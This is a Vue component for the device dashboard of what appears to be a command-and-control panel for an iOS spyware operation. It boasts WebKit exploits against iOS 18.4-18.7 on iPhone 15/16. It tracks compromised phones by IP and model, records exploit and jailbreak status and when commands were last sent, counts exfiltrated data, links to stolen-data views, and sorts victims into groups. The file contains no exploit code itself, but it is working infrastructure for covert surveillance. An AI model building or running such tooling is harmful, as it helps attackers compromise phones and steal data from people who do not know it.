<template>
  <div class="devices">
    <el-alert
      title="Compatibility Notice"
      type="info"
      :closable="false"
      show-icon
      style="margin-bottom: 15px;"
    >
      <p>Supports <strong>iOS 18.4 - 18.7</strong>, limited to <strong>iPhone 15 / 16 series (A17 Pro / A18 chips)</strong>; based on WebKit exploits, version-mismatched devices cannot be exploited.</p>
    </el-alert>

    <el-row :gutter="15" class="stats-row">
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #409eff;">
              <el-icon size="28"><Phone /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_devices || 0 }}</div>
              <div class="stat-label">Total Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #67c23a;">
              <el-icon size="28"><CircleCheck /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.active_devices || 0 }}</div>
              <div class="stat-label">Active Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #909399;">
              <el-icon size="28"><CircleClose /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.offline_devices || 0 }}</div>
              <div class="stat-label">Offline Devices</div>
            </div>
          </div>
        </el-card>
      </el-col>
      <el-col :span="6">
        <el-card shadow="hover">
          <div class="stat-card">
            <div class="stat-icon" style="background: #f56c6c;">
              <el-icon size="28"><FolderOpened /></el-icon>
            </div>
            <div class="stat-info">
              <div class="stat-value">{{ stats.total_exfil || 0 }}</div>
              <div class="stat-label">Exfil Data</div>
            </div>
          </div>
        </el-card>
      </el-col>
    </el-row>

    <el-card>
      <div class="toolbar-top">
        <el-radio-group v-model="viewMode" size="default">
          <el-radio-button value="list">
            <el-icon><List /></el-icon>&nbsp;List View
          </el-radio-button>
          <el-radio-button value="group">
            <el-icon><Grid /></el-icon>&nbsp;Group View
          </el-radio-button>
        </el-radio-group>
        <div class="toolbar-top-actions">
          <el-button type="primary" @click="openGroupDialog()">
            <el-icon><Collection /></el-icon>&nbsp;Group Manager
          </el-button>
          <el-button @click="refreshAllDevices">
            <el-icon><Refresh /></el-icon>&nbsp;Refresh Info
          </el-button>
        </div>
      </div>

      <div class="filter-bar">
        <el-input
          v-model="filters.search"
          placeholder="Search UUID / IP / Model / Version / Chip / Note"
          style="width: 320px;"
          clearable
          @keyup.enter="applyFilters"
        >
          <template #prefix><el-icon><Search /></el-icon></template>
        </el-input>
        <el-select v-model="filters.status" placeholder="Status" clearable style="width: 110px;">
          <el-option label="Active" value="active" />
          <el-option label="Offline" value="offline" />
        </el-select>
        <el-select v-model="filters.group_id" placeholder="Group" clearable style="width: 160px;">
          <el-option label="Ungrouped" :value="-1" />
          <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id" />
        </el-select>
        <el-select v-model="filters.os_version" placeholder="iOS Version" clearable filterable style="width: 130px;">
          <el-option v-for="v in osVersionOptions" :key="v" :label="v" :value="v" />
        </el-select>
        <el-select v-model="filters.device_model" placeholder="Device Model" clearable filterable style="width: 140px;">
          <el-option v-for="m in modelOptions" :key="m" :label="m" :value="m" />
        </el-select>
        <el-select v-model="filters.compatible" placeholder="Compatibility" clearable style="width: 120px;">
          <el-option label="Compatible" value="compatible" />
          <el-option label="Version Too Low" value="too_low" />
          <el-option label="Version Too High" value="too_high" />
          <el-option label="Unknown" value="unknown" />
        </el-select>
        <el-date-picker
          v-model="filters.first_seen_range"
          type="daterange"
          range-separator="to"
          start-placeholder="First Seen From"
          end-placeholder="First Seen To"
          value-format="YYYY-MM-DD"
          style="width: 260px;"
        />
        <el-date-picker
          v-model="filters.last_seen_range"
          type="daterange"
          range-separator="to"
          start-placeholder="Last Seen From"
          end-placeholder="Last Seen To"
          value-format="YYYY-MM-DD"
          style="width: 260px;"
        />
        <el-select v-model="filters.sort" placeholder="Sort" style="width: 140px;">
          <el-option label="Last Seen" value="last_seen" />
          <el-option label="First Seen" value="first_seen" />
          <el-option label="iOS Version" value="os_version" />
          <el-option label="Device Model" value="device_model" />
          <el-option label="Status" value="status" />
          <el-option label="IP Address" value="ip" />
          <el-option label="Group" value="group_id" />
        </el-select>
        <el-radio-group v-model="filters.order" size="small">
          <el-radio-button value="desc">Desc</el-radio-button>
          <el-radio-button value="asc">Asc</el-radio-button>
        </el-radio-group>
        <el-button type="primary" @click="applyFilters">
          <el-icon><Search /></el-icon>&nbsp;Search
        </el-button>
        <el-button @click="resetFilters">
          <el-icon><RefreshLeft /></el-icon>&nbsp;Reset
        </el-button>
      </div>

      <div v-if="selectedIds.length > 0" class="batch-bar">
        <el-tag type="info" effect="dark">
          Selected <strong>{{ selectedIds.length }}</strong> devices
        </el-tag>
        <el-button-group>
          <el-button type="primary" @click="openBatchSetGroupDialog">
            <el-icon><Collection /></el-icon>&nbsp;Move to Group
          </el-button>
          <el-button type="warning" @click="openBatchSetStatusDialog">
            <el-icon><Switch /></el-icon>&nbsp;Set Status
          </el-button>
          <el-button type="danger" @click="batchDelete">
            <el-icon><Delete /></el-icon>&nbsp;Batch Delete
          </el-button>
        </el-button-group>
        <el-button link @click="clearSelection">Clear Selection</el-button>
      </div>

      <el-row v-if="viewMode === 'group'" :gutter="15" class="group-view">
        <el-col :span="6" v-for="g in groupViewList" :key="'grp-'+g.key">
          <el-card shadow="hover" class="group-card" :class="{'group-card-active': activeGroupKey === g.key}" @click="filterByGroupKey(g.key)">
            <div class="group-card-header">
              <div class="group-card-color" :style="{background: g.color || '#909399'}"></div>
              <div class="group-card-name">{{ g.name }}</div>
              <el-tag class="group-card-count" type="info">{{ g.count }}</el-tag>
            </div>
            <div class="group-card-desc" v-if="g.description">{{ g.description }}</div>
            <div class="group-card-desc text-muted" v-else>{{ g.count }} devices, click to filter</div>
          </el-card>
        </el-col>
      </el-row>

      <el-table
        ref="tableRef"
        :data="devices"
        border
        v-loading="loading"
        row-key="device_uuid"
        @selection-change="handleSelectionChange"
        style="margin-top: 12px;"
      >
        <el-table-column type="selection" width="50" reserve-selection />
        <el-table-column prop="device_uuid" label="Device UUID" width="260" show-overflow-tooltip />
        <el-table-column prop="ip" label="IP Address" width="140" />
        <el-table-column prop="os_version" label="iOS Version" width="110">
          <template #default="scope">
            <span v-if="scope.row.os_version">{{ scope.row.os_version }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column prop="device_model" label="Device Model" width="120">
          <template #default="scope">
            <span v-if="scope.row.device_model">{{ scope.row.device_model }}</span>
            <span v-else class="text-muted">-</span>
          </template>
        </el-table-column>
        <el-table-column label="Compatibility" width="110">
          <template #default="scope">
            <el-tag :type="getCompatibilityTag(scope.row)" size="small">
              {{ getCompatibilityText(scope.row) }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="Group" width="160">
          <template #default="scope">
            <el-select
              :model-value="scope.row.group ? scope.row.group.id : (scope.row.group_id || -1)"
              placeholder="Ungrouped"
              size="small"
              clearable
              style="width: 140px;"
              @change="(val) => quickSetGroup(scope.row, val)"
            >
              <el-option label="Ungrouped" :value="-1" />
              <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id">
                <span class="dot" :style="{background:g.color}"></span>{{ g.name }}
              </el-option>
            </el-select>
          </template>
        </el-table-column>
        <el-table-column label="Note" width="180">
          <template #default="scope">
            <el-popover
              placement="left"
              :width="320"
              trigger="click"
              :title="'Edit Note - ' + (scope.row.device_uuid||'').slice(0,12)+'...'"
            >
              <el-input
                v-model="scope.row.note"
                type="textarea"
                :rows="3"
                maxlength="500"
                show-word-limit
                placeholder="Enter device note"
              />
              <div style="text-align:right;margin-top:8px;">
                <el-button size="small" @click="$event = null">Cancel</el-button>
                <el-button size="small" type="primary" @click="saveNote(scope.row)">Save</el-button>
              </div>
              <template #reference>
                <span class="note-cell" v-if="scope.row.note">{{ scope.row.note }}</span>
                <span class="note-cell text-muted add-note" v-else>+ Add Note</span>
              </template>
            </el-popover>
          </template>
        </el-table-column>
        <el-table-column prop="first_seen" label="First Seen" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.first_seen) }}</template>
        </el-table-column>
        <el-table-column prop="last_seen" label="Last Seen" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.last_seen) }}</template>
        </el-table-column>
        <el-table-column prop="status" label="Status" width="80">
          <template #default="scope">
            <el-tag :type="scope.row.status === 'active' ? 'success' : 'info'" size="small">
              {{ scope.row.status === 'active' ? 'Active' : 'Offline' }}
            </el-tag>
          </template>
        </el-table-column>
        <el-table-column label="Actions" width="260" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="viewDetail(scope.row)">Details</el-button>
            <el-button size="small" @click="viewLogs(scope.row.device_uuid)">Logs</el-button>
            <el-button size="small" @click="viewExfil(scope.row.device_uuid)">Data</el-button>
            <el-button size="small" type="danger" @click="deleteDevice(scope.row)">Delete</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-pagination
        style="margin-top: 15px;"
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50, 100]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>

    <el-dialog title="Device Details" v-model="detailDialogVisible" width="60%">
      <div v-loading="detailLoading">
        <el-descriptions :column="2" border v-if="currentDevice">
          <el-descriptions-item label="Device UUID">{{ currentDevice.device_uuid }}</el-descriptions-item>
          <el-descriptions-item label="IP Address">{{ currentDevice.ip || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Status">
            <el-tag :type="currentDevice.status === 'active' ? 'success' : 'info'">
              {{ currentDevice.status === 'active' ? 'Active' : 'Offline' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="Group">
            <el-tag v-if="currentDevice.group" :style="{borderColor:currentDevice.group.color,color:currentDevice.group.color}">
              {{ currentDevice.group.name }}
            </el-tag>
            <span v-else class="text-muted">Ungrouped</span>
          </el-descriptions-item>
          <el-descriptions-item label="iOS Version">{{ currentDevice.os_version || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Device Model">{{ currentDevice.device_model || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Chipset">{{ currentDevice.chipset || '-' }}</el-descriptions-item>
          <el-descriptions-item label="Jailbreak Status">
            <el-tag :type="currentDevice.jailbroken === 'yes' ? 'danger' : 'info'">
              {{ currentDevice.jailbroken || '-' }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="Exploit Status">
            <el-tag :type="getExploitStatusTag(currentDevice.exploit_status)">
              {{ getExploitStatusText(currentDevice.exploit_status) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="Compatibility">
            <el-tag :type="getCompatibilityTag(currentDevice)">
              {{ getCompatibilityText(currentDevice) }}
            </el-tag>
          </el-descriptions-item>
          <el-descriptions-item label="First Seen">{{ formatDateTime(currentDevice.first_seen) }}</el-descriptions-item>
          <el-descriptions-item label="Last Seen">{{ formatDateTime(currentDevice.last_seen) }}</el-descriptions-item>
          <el-descriptions-item label="Last Command Time" span="2">
            {{ currentDevice.last_command_time ? formatDateTime(currentDevice.last_command_time) : '-' }}
          </el-descriptions-item>
          <el-descriptions-item label="Note" span="2">
            <el-input
              :model-value="currentDevice.note"
              type="textarea"
              :rows="2"
              maxlength="500"
              show-word-limit
              placeholder="Enter note"
              @update:model-value="currentDevice.note = $event"
            />
            <div style="margin-top:6px;">
              <el-button size="small" type="primary" @click="saveNote(currentDevice)">Save Note</el-button>
            </div>
          </el-descriptions-item>
          <el-descriptions-item label="User Agent" span="2">
            <el-input :model-value="currentDevice.user_agent" type="textarea" :rows="3" readonly style="width:100%;" />
          </el-descriptions-item>
        </el-descriptions>
      </div>
      <template #footer>
        <el-button @click="detailDialogVisible = false">Close</el-button>
        <el-button type="primary" @click="goToDeviceDetail">View Full Details</el-button>
      </template>
    </el-dialog>

    <el-dialog title="Group Manager" v-model="groupDialogVisible" width="650px">
      <div style="margin-bottom: 12px;">
        <el-button type="primary" @click="startCreateGroup">
          <el-icon><Plus /></el-icon>&nbsp;New Group
        </el-button>
        <span class="text-muted" style="margin-left:12px;">
          Ungrouped devices: <el-tag type="info">{{ groupsSummary.ungrouped_count || 0 }}</el-tag>
        </span>
      </div>
      <el-table :data="groups" border stripe v-loading="groupsLoading">
        <el-table-column label="Color" width="70" align="center">
          <template #default="scope">
            <span class="swatch" :style="{background: scope.row.color || '#409EFF'}"></span>
          </template>
        </el-table-column>
        <el-table-column prop="name" label="Group Name" width="160" />
        <el-table-column prop="description" label="Description" show-overflow-tooltip />
        <el-table-column label="Devices" width="90" align="center">
          <template #default="scope"><el-tag type="info">{{ scope.row.device_count || 0 }}</el-tag></template>
        </el-table-column>
        <el-table-column prop="created_at" label="Created At" width="160">
          <template #default="scope">{{ formatDateTime(scope.row.created_at) }}</template>
        </el-table-column>
        <el-table-column label="Actions" width="170" fixed="right">
          <template #default="scope">
            <el-button size="small" type="primary" @click="startEditGroup(scope.row)">Edit</el-button>
            <el-button size="small" type="danger" @click="startDeleteGroup(scope.row)">Delete</el-button>
          </template>
        </el-table-column>
      </el-table>

      <el-divider v-if="groupFormVisible" />
      <div v-if="groupFormVisible">
        <h4>{{ groupEditing ? 'Edit Group' : 'New Group' }}</h4>
        <el-form :model="groupForm" label-width="80px">
          <el-form-item label="Name">
            <el-input v-model="groupForm.name" maxlength="100" placeholder="Enter group name" />
          </el-form-item>
          <el-form-item label="Color">
            <el-color-picker v-model="groupForm.color" />
          </el-form-item>
          <el-form-item label="Description">
            <el-input v-model="groupForm.description" type="textarea" :rows="2" maxlength="500" />
          </el-form-item>
          <el-form-item>
            <el-button type="primary" @click="submitGroupForm">Save</el-button>
            <el-button @click="groupFormVisible = false">Cancel</el-button>
          </el-form-item>
        </el-form>
      </div>

      <el-divider v-if="deleteGroupTarget" />
      <div v-if="deleteGroupTarget">
        <h4>Delete Group: <el-tag type="danger">{{ deleteGroupTarget.name }}</el-tag></h4>
        <p class="text-muted">This group has <strong>{{ deleteGroupTarget.device_count || 0 }}</strong> devices. Choose how to handle them:</p>
        <el-form label-width="120px">
          <el-form-item label="Move devices to">
            <el-select v-model="deleteMoveTarget" style="width:260px;">
              <el-option label="Keep as Ungrouped" :value="-1" />
              <el-option
                v-for="g in groups.filter(x => x.id !== deleteGroupTarget.id)"
                :key="g.id"
                :label="g.name"
                :value="g.id"
              />
            </el-select>
          </el-form-item>
          <el-form-item>
            <el-button type="danger" @click="confirmDeleteGroup">Confirm Delete</el-button>
            <el-button @click="deleteGroupTarget = null; deleteMoveTarget = -1;">Cancel</el-button>
          </el-form-item>
        </el-form>
      </div>
    </el-dialog>

    <el-dialog title="Batch — Move to Group" v-model="batchGroupDialogVisible" width="450px">
      <p>Move <strong>{{ selectedIds.length }}</strong> devices to:</p>
      <el-select v-model="batchGroupId" placeholder="Select Group" style="width:100%;margin:12px 0;">
        <el-option label="Ungrouped" :value="-1" />
        <el-option v-for="g in groups" :key="g.id" :label="g.name" :value="g.id">
          <span class="dot" :style="{background:g.color}"></span>{{ g.name }}
        </el-option>
      </el-select>
      <template #footer>
        <el-button @click="batchGroupDialogVisible = false">Cancel</el-button>
        <el-button type="primary" @click="confirmBatchSetGroup">Confirm Move</el-button>
      </template>
    </el-dialog>

    <el-dialog title="Batch — Set Status" v-model="batchStatusDialogVisible" width="450px">
      <p>Set <strong>{{ selectedIds.length }}</strong> devices status to:</p>
      <el-radio-group v-model="batchStatus" style="margin:12px 0;">
        <el-radio-button value="active">Active</el-radio-button>
        <el-radio-button value="offline">Offline</el-radio-button>
      </el-radio-group>
      <template #footer>
        <el-button @click="batchStatusDialogVisible = false">Cancel</el-button>
        <el-button type="primary" @click="confirmBatchSetStatus">Confirm</el-button>
      </template>
    </el-dialog>
  </div>
</template>

<script setup>
import { ref, reactive, onMounted, computed, nextTick } from 'vue'
import { useRouter } from 'vue-router'
import axios from '../utils/axios'
import { ElMessage, ElMessageBox } from 'element-plus'
import {
  Phone, CircleCheck, CircleClose, FolderOpened, Search, List, Grid,
  Refresh, RefreshLeft, Collection, Delete, Switch, Plus
} from '@element-plus/icons-vue'
import { formatDateTime, formatStatus } from '../utils'

const router = useRouter()

const devices = ref([])
const loading = ref(false)
const stats = ref({})
const selectedIds = ref([])
const tableRef = ref(null)

const viewMode = ref('list')
const activeGroupKey = ref(null)

const filters = reactive({
  search: '',
  status: '',
  group_id: null,
  os_version: '',
  device_model: '',
  compatible: '',
  first_seen_range: [],
  last_seen_range: [],
  sort: 'last_seen',
  order: 'desc'
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

const detailDialogVisible = ref(false)
const detailLoading = ref(false)
const currentDevice = ref(null)

const groups = ref([])
const groupsLoading = ref(false)
const groupsSummary = ref({})

const groupDialogVisible = ref(false)
const groupFormVisible = ref(false)
const groupEditing = ref(null)
const groupForm = reactive({ name: '', color: '#409EFF', description: '' })
const deleteGroupTarget = ref(null)
const deleteMoveTarget = ref(-1)

const batchGroupDialogVisible = ref(false)
const batchGroupId = ref(-1)
const batchStatusDialogVisible = ref(false)
const batchStatus = ref('active')

const osVersionOptions = computed(() => {
  const s = new Set()
  if (stats.value.by_os_version) Object.keys(stats.value.by_os_version).forEach(v => v && s.add(v))
  devices.value.forEach(d => d.os_version && s.add(d.os_version))
  return Array.from(s).sort()
})
const modelOptions = computed(() => {
  const s = new Set()
  if (stats.value.by_model) Object.keys(stats.value.by_model).forEach(m => m && s.add(m))
  devices.value.forEach(d => d.device_model && s.add(d.device_model))
  return Array.from(s).sort()
})

const groupViewList = computed(() => {
  const list = []
  list.push({ key: 'ungrouped', name: 'Ungrouped', color: '#909399', description: '', count: groupsSummary.value.ungrouped_count || 0 })
  groups.value.forEach(g => list.push({ key: 'g-' + g.id, name: g.name, color: g.color, description: g.description, count: g.device_count || 0 }))
  return list
})

function getExploitStatusTag(status) {
  const tags = { 'success': 'success', 'failed': 'danger', 'in_progress': 'warning' }
  return tags[status] || 'info'
}
function getExploitStatusText(status) {
  const texts = { 'success': 'Exploit Successful', 'failed': 'Exploit Failed', 'in_progress': 'Exploiting' }
  return texts[status] || (status || '-')
}
function getCompatibilityTag(row) {
  if (!row) return 'info'
  const lvl = (row.compatible_level !== undefined) ? row.compatible_level : null
  if (lvl === 'compatible') return 'success'
  if (lvl === 'too_low') return 'danger'
  if (lvl === 'too_high') return 'warning'
  if (!row.os_version) return 'info'
  const supported = ['18.4', '18.5', '18.6', '18.7']
  if (supported.includes(row.os_version)) return 'success'
  const parts = (row.os_version || '').split('.').map(Number)
  const major = parts[0] || 0, minor = parts[1] || 0
  if (major < 18 || (major === 18 && minor < 4)) return 'danger'
  return 'warning'
}
function getCompatibilityText(row) {
  if (!row) return 'Unknown'
  const lvl = (row.compatible_level !== undefined) ? row.compatible_level : null
  if (lvl === 'compatible') return 'Compatible'
  if (lvl === 'too_low') return 'Version Too Low'
  if (lvl === 'too_high') return 'Version Too High'
  if (!row.os_version) return 'Unknown'
  const supported = ['18.4', '18.5', '18.6', '18.7']
  if (supported.includes(row.os_version)) return 'Compatible'
  const parts = (row.os_version || '').split('.').map(Number)
  const major = parts[0] || 0, minor = parts[1] || 0
  if (major < 18 || (major === 18 && minor < 4)) return 'Version Too Low'
  return 'Version Too High'
}

async function loadStats() {
  try {
    const response = await axios.get('/api/devices/stats')
    stats.value = response.data
  } catch (e) {
    console.error('Failed to load stats:', e)
  }
}

async function loadGroups() {
  groupsLoading.value = true
  try {
    const r = await axios.get('/api/devices/groups')
    groups.value = r.data.items || []
    groupsSummary.value = { total: r.data.total || 0, ungrouped_count: r.data.ungrouped_count || 0 }
  } catch (e) {
    console.error('Failed to load groups:', e)
  } finally {
    groupsLoading.value = false
  }
}

async function loadDevices() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', String((pagination.page - 1) * pagination.size))
    params.append('limit', String(pagination.size))
    if (filters.search) params.append('search', filters.search)
    if (filters.status) params.append('status', filters.status)
    if (filters.group_id === -1) params.append('ungrouped_only', 'true')
    else if (filters.group_id != null && filters.group_id !== '') params.append('group_id', String(filters.group_id))
    if (filters.os_version) params.append('os_version', filters.os_version)
    if (filters.device_model) params.append('device_model', filters.device_model)
    if (filters.compatible) params.append('compatible', filters.compatible)
    if (filters.first_seen_range && filters.first_seen_range.length === 2) {
      params.append('first_seen_from', filters.first_seen_range[0])
      params.append('first_seen_to', filters.first_seen_range[1])
    }
    if (filters.last_seen_range && filters.last_seen_range.length === 2) {
      params.append('last_seen_from', filters.last_seen_range[0])
      params.append('last_seen_to', filters.last_seen_range[1])
    }
    if (filters.sort) params.append('sort', filters.sort)
    if (filters.order) params.append('order', filters.order)

    const response = await axios.get(`/api/devices?${params.toString()}`)
    const data = response.data || {}
    devices.value = Array.isArray(data) ? data : (data.items || [])
    pagination.total = Array.isArray(data) ? data.length : (data.total || 0)
  } catch (e) {
    console.error('Failed to load devices:', e)
    ElMessage.error('Failed to load devices')
  } finally {
    loading.value = false
  }
}

function applyFilters() {
  pagination.page = 1
  loadDevices()
}

function resetFilters() {
  filters.search = ''
  filters.status = ''
  filters.group_id = null
  filters.os_version = ''
  filters.device_model = ''
  filters.compatible = ''
  filters.first_seen_range = []
  filters.last_seen_range = []
  filters.sort = 'last_seen'
  filters.order = 'desc'
  activeGroupKey.value = null
  pagination.page = 1
  loadDevices()
}

function filterByGroupKey(key) {
  activeGroupKey.value = key
  if (key === 'ungrouped') {
    filters.group_id = -1
  } else if (key && key.startsWith('g-')) {
    filters.group_id = Number(key.slice(2))
  } else {
    filters.group_id = null
  }
  applyFilters()
}

function handleSelectionChange(selection) {
  selectedIds.value = selection.map(item => item.device_uuid)
}

function clearSelection() {
  if (tableRef.value) tableRef.value.clearSelection()
  selectedIds.value = []
}

function viewDetail(row) {
  currentDevice.value = JSON.parse(JSON.stringify(row))
  detailDialogVisible.value = true
}

function goToDeviceDetail() {
  if (!currentDevice.value) return
  detailDialogVisible.value = false
  router.push(`/devices/${currentDevice.value.device_uuid}`)
}

function viewLogs(uuid) {
  router.push(`/logs?device_uuid=${uuid}`)
}
function viewExfil(uuid) {
  router.push(`/exfil?device_uuid=${uuid}`)
}

async function deleteDevice(row) {
  try {
    await ElMessageBox.confirm('Delete this device? Associated data will also be removed.', 'Warning', { type: 'warning' })
    await axios.delete(`/api/devices/${row.device_uuid}`)
    ElMessage.success('Deleted')
    afterDataChanged()
  } catch (e) {
    if (e !== 'cancel') ElMessage.error('Delete failed')
  }
}

async function batchDelete() {
  if (selectedIds.value.length === 0) return
  try {
    await ElMessageBox.confirm(
      `Delete ${selectedIds.value.length} selected devices? Associated data will also be removed.`,
      'Warning', { type: 'warning' }
    )
    const r = await axios.post('/api/devices/batch-delete', { device_uuids: selectedIds.value })
    ElMessage.success(`Deleted ${r.data.deleted || 0} devices`)
    clearSelection()
    afterDataChanged()
  } catch (e) {
    if (e !== 'cancel') ElMessage.error('Batch delete failed')
  }
}

function openBatchSetGroupDialog() {
  batchGroupId.value = -1
  batchGroupDialogVisible.value = true
}
async function confirmBatchSetGroup() {
  try {
    const gid = batchGroupId.value === -1 ? null : batchGroupId.value
    const r = await axios.post('/api/devices/batch-set-group', { device_uuids: selectedIds.value, group_id: gid })
    ElMessage.success(`Moved ${r.data.updated || 0} devices`)
    batchGroupDialogVisible.value = false
    clearSelection()
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Operation failed')
  }
}

function openBatchSetStatusDialog() {
  batchStatus.value = 'active'
  batchStatusDialogVisible.value = true
}
async function confirmBatchSetStatus() {
  try {
    const r = await axios.post('/api/devices/batch-set-status', { device_uuids: selectedIds.value, status: batchStatus.value })
    ElMessage.success(`Updated ${r.data.updated || 0} device statuses`)
    batchStatusDialogVisible.value = false
    clearSelection()
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Operation failed')
  }
}

async function quickSetGroup(row, val) {
  try {
    const gid = (val === -1 || val == null || val === '') ? 0 : Number(val)
    await axios.patch(`/api/devices/${row.device_uuid}`, { group_id: gid })
    ElMessage.success('Group updated')
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Failed to update group')
  }
}

async function saveNote(row) {
  try {
    await axios.patch(`/api/devices/${row.device_uuid}`, { note: row.note || '' })
    ElMessage.success('Note saved')
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Failed to save note')
  }
}

async function refreshAllDevices() {
  try {
    const response = await axios.post('/api/devices/refresh-all')
    ElMessage.success(response.data.message)
    afterDataChanged()
  } catch (e) {
    ElMessage.error('Refresh failed')
  }
}

function afterDataChanged() {
  loadDevices()
  loadStats()
  loadGroups()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadDevices()
}
function handleCurrentChange(page) {
  pagination.page = page
  loadDevices()
}

function openGroupDialog() {
  groupDialogVisible.value = true
  groupFormVisible.value = false
  deleteGroupTarget.value = null
  deleteMoveTarget.value = -1
  loadGroups()
}

function startCreateGroup() {
  groupEditing.value = null
  groupForm.name = ''
  groupForm.color = '#409EFF'
  groupForm.description = ''
  groupFormVisible.value = true
}

function startEditGroup(g) {
  groupEditing.value = g
  groupForm.name = g.name
  groupForm.color = g.color || '#409EFF'
  groupForm.description = g.description || ''
  groupFormVisible.value = true
}

async function submitGroupForm() {
  const name = (groupForm.name || '').trim()
  if (!name) { ElMessage.warning('Enter group name'); return }
  try {
    if (groupEditing.value) {
      await axios.patch(`/api/devices/groups/${groupEditing.value.id}`, {
        name, color: groupForm.color, description: groupForm.description
      })
      ElMessage.success('Group updated')
    } else {
      await axios.post('/api/devices/groups', {
        name, color: groupForm.color, description: groupForm.description
      })
      ElMessage.success('Group created')
    }
    groupFormVisible.value = false
    groupEditing.value = null
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Failed to save group')
  }
}

function startDeleteGroup(g) {
  deleteGroupTarget.value = g
  deleteMoveTarget.value = -1
}

async function confirmDeleteGroup() {
  if (!deleteGroupTarget.value) return
  try {
    let url = `/api/devices/groups/${deleteGroupTarget.value.id}`
    if (deleteMoveTarget.value > 0) {
      url += `?move_devices_to_group_id=${deleteMoveTarget.value}`
    }
    await axios.delete(url)
    ElMessage.success('Group deleted')
    deleteGroupTarget.value = null
    deleteMoveTarget.value = -1
    afterDataChanged()
  } catch (e) {
    ElMessage.error(e?.response?.data?.detail || 'Failed to delete group')
  }
}

onMounted(async () => {
  await Promise.all([loadStats(), loadGroups()])
  loadDevices()
})
</script>

<style scoped>
.stats-row { margin-bottom: 15px; }
.distribution-row { margin-bottom: 15px; }
.stat-card { display: flex; align-items: center; gap: 15px; }
.stat-icon { width: 60px; height: 60px; border-radius: 8px; display: flex; align-items: center; justify-content: center; color: white; }
.stat-info { flex: 1; }
.stat-value { font-size: 24px; font-weight: bold; color: #333; }
.stat-label { font-size: 14px; color: #999; margin-top: 5px; }

.tag-wrap { display: flex; flex-wrap: wrap; gap: 6px; }
.dist-tag { margin-right: 0 !important; }

.toolbar-top { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-wrap: wrap; gap: 10px; }
.toolbar-top-actions { display: flex; gap: 10px; }

.filter-bar { display: flex; gap: 10px; flex-wrap: wrap; align-items: center; padding: 10px; background: #fafafa; border-radius: 6px; margin-bottom: 10px; }

.batch-bar { display: flex; align-items: center; gap: 12px; padding: 10px 14px; background: linear-gradient(90deg,#ecf5ff,#e1f3d8); border: 1px solid #d9ecff; border-radius: 6px; margin: 10px 0; }

.group-view { margin-top: 12px; margin-bottom: 12px; }
.group-card { cursor: pointer; transition: all 0.2s; }
.group-card:hover { transform: translateY(-2px); }
.group-card-active { outline: 2px solid #409EFF; }
.group-card-header { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
.group-card-color { width: 14px; height: 14px; border-radius: 50%; flex-shrink: 0; }
.group-card-name { font-weight: 600; font-size: 15px; flex: 1; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.group-card-count { font-weight: 600; }
.group-card-desc { font-size: 13px; color: #606266; line-height: 1.5; min-height: 20px; }

.note-cell { display: inline-block; max-width: 100%; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; cursor: pointer; padding: 2px 4px; border-radius: 4px; }
.note-cell:hover { background: #ecf5ff; }
.add-note { color: #c0c4cc; }

.text-muted { color: #909399; }

.swatch { display: inline-block; width: 24px; height: 24px; border-radius: 4px; border: 1px solid #ddd; }
.dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 6px; vertical-align: middle; }
</style>
